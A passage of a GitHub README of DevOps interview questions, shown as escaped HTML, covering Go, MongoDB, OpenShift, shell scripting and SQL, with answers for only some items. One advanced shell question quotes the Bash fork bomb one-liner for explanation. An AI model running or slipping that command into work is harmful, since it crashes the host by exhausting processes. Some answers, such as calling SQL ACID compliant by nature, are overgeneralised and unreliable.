&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between &lt;code&gt;var x int = 2&lt;/code&gt; and &lt;code&gt;x := 2&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The result is the same, a variable with the value 2.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;With &lt;code&gt;var x int = 2&lt;/code&gt; we are setting the variable type to integer while with &lt;code&gt;x := 2&lt;/code&gt; we are letting Go figure out by itself the type.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? In Go we can redeclare variables and once declared we must use it.&lt;/summary&gt;
&lt;p&gt;False. We can't redeclare variables but yes, we must used declared variables.
&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What libraries of Go have you used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;This should be answered based on your usage but some examples are:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;fmt - formatted I/O
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is the problem with the following block of code? How to fix it?
&lt;pre&gt;&lt;code&gt;func main() {
    var x float32 = 13.5
    var y int
    y = x
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;The following block of code tries to convert the integer 101 to a string but instead we get "e". Why is that? How to fix it?
&lt;pre&gt;&lt;code&gt;package main

import "fmt"

func main() {
    var x int = 101
    var y string
    y = string(x)
    fmt.Println(y)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It looks what unicode value is set at 101 and uses it for converting the integer to a string.
If you want to get "101" you should use the package "strconv" and replace &lt;code&gt;y = string(x)&lt;/code&gt; with &lt;code&gt;y = strconv.Itoa(x)&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is wrong with the following code?:
&lt;pre&gt;&lt;code&gt;package main

func main() {
    var x = 2
    var y = 3
    const someConst = x + y
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What will be the output of the following block of code?:
&lt;pre&gt;&lt;code&gt;package main

import "fmt"

const (
	x = iota
	y = iota
)
const z = iota

func main() {
	fmt.Printf("%v\n", x)
	fmt.Printf("%v\n", y)
	fmt.Printf("%v\n", z)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What _ is used for in Go?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What will be the output of the following block of code?:
&lt;pre&gt;&lt;code&gt;package main

import "fmt"

const (
	_ = iota + 3
	x
)

func main() {
	fmt.Printf("%v\n", x)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-mongo" class="anchor" aria-hidden="true" href="#mongo"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mongo&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-mongo-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-18" class="anchor" aria-hidden="true" href="#baby-beginner-18"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What are the advantages of MongoDB? Or in other words, why choosing MongoDB and not other implementation of NoSQL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between SQL and NoSQL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The main difference is that SQL databases are structured (data is stored in the form of
tables with rows and columns - like an excel spreadsheet table) while NoSQL is
unstructured, and the data storage can vary depending on how the NoSQL DB is set up, such
as key-value pair, document-oriented, etc.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;In what scenarios would you prefer to use NoSQL/Mongo over SQL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Heterogeneous data which changes often&lt;/li&gt;
&lt;li&gt;Data consistency and integrity is not top priority&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Best if the database needs to scale rapidly
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is a document? What is a collection?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an aggregator?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is better? Embedded documents or referenced?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Have you performed data retrieval optimizations in Mongo? If not, can you think about ways to optimize a slow data retrieval?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-queries" class="anchor" aria-hidden="true" href="#queries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Queries&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Explain this query: &lt;code&gt;db.books.find({"name": /abc/})&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain this query: &lt;code&gt;db.books.find().sort({x:1})&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-openshift" class="anchor" aria-hidden="true" href="#openshift"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;OpenShift&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-openshift-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-19" class="anchor" aria-hidden="true" href="#baby-beginner-19"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is OpenShift? Did you use it? If yes, how?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you explain the difference between OpenShift and Kubernetes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Define Pods and explain what are stateful pods&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of build strategies are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what are labels and what they are used for&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what are annotations and how they are different from labels&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Downward API&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-shell-scripting" class="anchor" aria-hidden="true" href="#shell-scripting"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Shell Scripting&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-shell-scripting-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-20" class="anchor" aria-hidden="true" href="#baby-beginner-20"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Tell me about your experience with shell scripting&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What this line in scripts mean?: &lt;code&gt;#!/bin/bash&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What do you tend to include in every script you write?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Few example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Comments on how to run it and/or what it does&lt;/li&gt;
&lt;li&gt;Adding "set -e" since I want the script to exit if a certain command failed&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can have an entirely different answer. It's based only on your experience.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False?: when a certain command/line fails, the script, by default, will exit and will no keep running&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Depends on the language and settings used.
When a script written in Bash fails to run a certain command it will keep running and will execute all other commands mentioned after the command which failed.
Most of the time we would actually want the opposite to happen. In order to make Bash exist when a specific command fails, use 'set -e' in your script.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Today we have tools and technologies like Ansible. Why would someone still use shell scripting?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Speed&lt;/li&gt;
&lt;li&gt;The module we need doesn't exist&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;We are delivering the scripts to customers who don't have access to the public network and don't necessarily have Ansible installed on their systems.
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what would be the result of each command:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;echo $0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $?&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $#&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How do you debug shell scripts?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Answer depends on the language you are using for writing your scripts. If Bash is used for example then:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Adding -x to the script I'm running in Bash&lt;/li&gt;
&lt;li&gt;Old good way of adding echo statements&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;If Python, then using pdb is very useful.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you get input from the user in shell scripts?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Using the keyword &lt;code&gt;read&lt;/code&gt; so for example &lt;code&gt;read x&lt;/code&gt; will wait for user input and will store it in the variable x.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain conditionals and how do you use them&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a loop? What types of loops are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain &lt;code&gt;continue&lt;/code&gt; and &lt;code&gt;break&lt;/code&gt;. When do you use them if at all?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to store the output of a command in a variable?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you check variable length?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between single and double quotes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a script which will list the differences between two directories&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-practical" class="anchor" aria-hidden="true" href="#practical"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Practical&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Write a script to determine whether a host is up or down&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a script to remove all the empty files in a given directory (also nested directories)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-shell-scripting-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-advanced" class="anchor" aria-hidden="true" href="#advanced"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following code:
&lt;p&gt;&lt;code&gt;:(){ :|:&amp;amp; };:&lt;/code&gt;&lt;/p&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you give an example to some Bash best practices?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the ternary operator? How do you use it in bash?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;A short way of using if/else. An example:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;[[ $a = 1 ]] &amp;amp;&amp;amp; b="yes, equal" || b="nope"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What does the following code do and when would you use it?
&lt;p&gt;&lt;code&gt;diff &amp;lt;(ls /tmp) &amp;lt;(ls /var/tmp)&lt;/code&gt;&lt;/p&gt;
&lt;/summary&gt;&lt;br&gt;
It is called 'process substitution'. It provides a way to pass the output of a command to another command when using a pipe &lt;code&gt;|&lt;/code&gt; is not possible. It can be used when a command does not support &lt;code&gt;STDIN&lt;/code&gt; or you need the output of multiple commands. 
&lt;a href="https://superuser.com/a/1060002/167769" rel="nofollow"&gt;https://superuser.com/a/1060002/167769&lt;/a&gt;
&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-sql" class="anchor" aria-hidden="true" href="#sql"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SQL&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-sql-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-21" class="anchor" aria-hidden="true" href="#baby-beginner-21"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What does SQL stand for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Structured Query Language&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How is SQL Different from NoSQL&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The main difference is that SQL databases are structured (data is stored in the form of
tables with rows and columns - like an excel spreadsheet table) while NoSQL is
unstructured, and the data storage can vary depending on how the NoSQL DB is set up, such
as key-value pair, document-oriented, etc.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What does it mean when a database is ACID compliant?&lt;/summary&gt;&lt;br&gt;
&lt;p&gt;ACID stands for Atomicity, Consistency, Isolation, Durability. In order to be ACID compliant, the database much meet each of the four criteria&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Atomicity&lt;/strong&gt; - When a change occurs to the database, it should either succeed or fail as a whole.&lt;/p&gt;
&lt;p&gt;For example, if you were to update a table, the update should completely execute. If it only partially executes, the
update is considered failed as a whole, and will not go through - the DB will revert back to it's original
state before the update occurred. It should also be mentioned that Atomicity ensures that each
transaction is completed as it's own stand alone "unit" - if any part fails, the whole statement fails.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - any change made to the database should bring it from one valid state into the next.&lt;/p&gt;
&lt;p&gt;For example, if you make a change to the DB, it shouldn't corrupt it. Consistency is upheld by checks and constraints that
are pre-defined in the DB. For example, if you tried to change a value from a string to an int when the column
should be of datatype string, a consistent DB would not allow this transaction to go through, and the action would
not be executed&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - this ensures that a database will never be seen "mid-update" - as multiple transactions are running at
the same time, it should still leave the DB in the same state as if the transactions were being run sequentially.&lt;/p&gt;
&lt;p&gt;For example, let's say that 20 other people were making changes to the database at the same time. At the
time you executed your query, 15 of the 20 changes had gone through, but 5 were still in progress. You should
only see the 15 changes that had completed - you wouldn't see the database mid-update as the change goes through.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Durability&lt;/strong&gt; - Once a change is committed, it will remain committed regardless of what happens
(power failure, system crash, etc.). This means that all completed transactions
must be recorded in non-volatile memory.&lt;/p&gt;
&lt;p&gt;Note that SQL is by nature ACID compliant. Certain NoSQL DB's can be ACID compliant depending on
how they operate, but as a general rule of thumb, NoSQL DB's are not considered ACID compliant&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;When is it best to use SQL? NoSQL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;SQL - Best used when data integrity is crucial. SQL is typically implemented with many
businesses and areas within the finance field due to it's ACID compliance.&lt;/p&gt;
&lt;p&gt;NoSQL - Great if you need to scale things quickly. NoSQL was designed with web applications
in mind, so it works great if you need to quickly spread the same information around to
multiple servers&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Additionally, since NoSQL does not adhere to the strict table with columns and rows structure
that Relational Databases require, you can store different data types together.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a Cartesian Product?&lt;/summary&gt;&lt;br&gt;
&lt;p&gt;A Cartesian product is when all rows from the first table are joined to all rows in the second
table. This can be done implicitly by not defining a key to join, or explicitly by
calling a CROSS JOIN on two tables, such as below:&lt;/p&gt;
&lt;p&gt;Select * from customers &lt;strong&gt;CROSS JOIN&lt;/strong&gt; orders;&lt;/p&gt;
&lt;p&gt;Note that a Cartesian product can also be a bad thing - when performing a join
on two tables in which both do not have unique keys, this could cause the returned information
to be incorrect.&lt;/p&gt;
&lt;/details&gt;
